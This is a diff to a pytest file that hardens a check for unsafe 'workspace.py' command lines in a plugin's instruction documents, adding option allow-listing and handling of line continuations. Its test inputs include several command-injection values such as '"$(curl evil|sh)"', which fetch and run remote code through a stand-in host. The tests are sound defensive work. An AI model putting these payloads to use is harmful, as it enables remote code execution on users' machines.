@@ -76,7 +76,9 @@ def test_skill_gets_its_paths_from_the_workspace_script(name):
 
 
 SETTING_LINE = "The Fitmark folder setting is: ${user_config.workspace}"
-UNTRUSTED_OPTION = re.compile(r"--(agency|client|file|name|path|ref|role|slug|workspace)\b")
+COMMAND_LINE_OPTIONS = {"plugin-root", "plugin-data", "args-stdin"}
+OPTION = re.compile(r"(?<![\w-])--([a-z][a-z-]*)")
+LINE_CONTINUATION = re.compile(r"\\\r?\n[ \t]*")
 INSTRUCTION_FILES = [
     ROOT / "docs" / "SKILL_GUIDELINES.md",
     ROOT / "references" / "quick-start.md",
@@ -95,8 +97,9 @@ def unsafe_commands(text):
     """workspace.py commands with a value from outside on the command line."""
     return [
         line
-        for line in text.splitlines()
-        if "workspace.py" in line and UNTRUSTED_OPTION.search(line)
+        for line in LINE_CONTINUATION.sub(" ", text).splitlines()
+        if "workspace.py" in line
+        and ("$(" in line or set(OPTION.findall(line)) - COMMAND_LINE_OPTIONS)
     ]
 
 
@@ -119,10 +122,24 @@ def test_the_check_allows_the_setting_in_prose():
 
 @pytest.mark.parametrize(
     "line",
-    ['workspace.py candidate --name "$(curl evil|sh)"', "workspace.py init --path ~/x"],
+    [
+        'workspace.py candidate --name "$(curl evil|sh)"',
+        "workspace.py init --path ~/x",
+        'workspace.py record --candidate "$(curl evil|sh)"',
+        "workspace.py record --job x",
+        "workspace.py record --status x",
+        "workspace.py init --anything-new x",
+        'workspace.py candidate "$(curl evil|sh)"',
+        'workspace.py resolve --plugin-root "$(curl evil|sh)"',
+    ],
 )
 def test_the_check_catches_values_on_a_command_line(line):
     assert unsafe_commands(line) == [line]
+
+
+def test_the_check_follows_a_command_over_several_lines():
+    text = 'python3 workspace.py candidate \\\n    --name "$(curl evil|sh)"\n'
+    assert len(unsafe_commands(text)) == 1
 
 
 def test_the_check_allows_values_in_stdin():
